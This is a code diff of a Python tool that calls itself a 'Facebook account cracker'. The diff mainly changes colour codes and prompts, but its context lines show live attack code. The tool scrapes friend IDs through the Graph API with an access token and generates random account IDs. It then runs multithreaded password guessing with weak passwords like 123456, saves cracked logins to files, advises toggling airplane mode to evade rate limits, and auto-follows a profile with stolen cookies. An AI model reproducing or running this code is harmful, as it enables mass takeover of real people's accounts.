@@ -157,7 +157,7 @@ def public_menu():
 		exit()
 	clear()
 	print(logo)
-	pil = input('\n [+] Enter ID Target : ')
+	pil = input('\n [+] Enter Public ID : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 		for pi in koh2['friends']['data']:
@@ -228,7 +228,7 @@ def passmenu():
 		
 def first():
 	clear()
-	print(logo);print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	print(logo);print( ' [!] \033[1;97mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -255,7 +255,7 @@ def first():
 				pool.submit(crack,idf,pwv)
 def name():
 	clear()
-	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	print(logo);print( '\n [] OK Result Saved To : \033[1;73mOK/%s\033[1;73m\n [] CP Result Saved To : \033[1;97mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			try:
@@ -387,7 +387,7 @@ def follow(ses,coki):
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
-logo = ("""\033[1;73m
+logo = ("""\033[1;97m
 ╔═══╗╔╗─╔╗╔═══╗╔═══╗╔══╗╔═══╗
 ║╔═╗║║║─║║║╔═╗║║╔══╝╚╣─╝║╔═╗║
 ║╚══╗║╚═╝║║║─║║║╚══╗─║║─║║─║║
@@ -435,7 +435,6 @@ class Main:
 			self.old2()
 		if JAHIED in ["6", "06"]:
 			os.system("git pull")
-			time.sleep(1)
 			Main()
 		if JAHIED in ["7", "07"]:
 			exit('[×] THANK YOU FOR USING OUR TOOL')
@@ -449,7 +448,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m FACEBOOK ACCOUNT CRACKER - LIMIT 80,000: "))
+		limit = int(input(" \n\033[0;73m[+]\033[0;95m FACEBOOK ACCOUNT CRACKER - LIMIT 80,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -458,11 +457,11 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
+				print("\n\033[1;95m [!] USE (123456) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
-				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;97m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
@@ -876,14 +875,14 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m FB ACCOUNT CRACKER - LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m FB ACCOUNT CRACKER - LIMIT 80,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			
-			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			print("\033[0;97m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
 				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
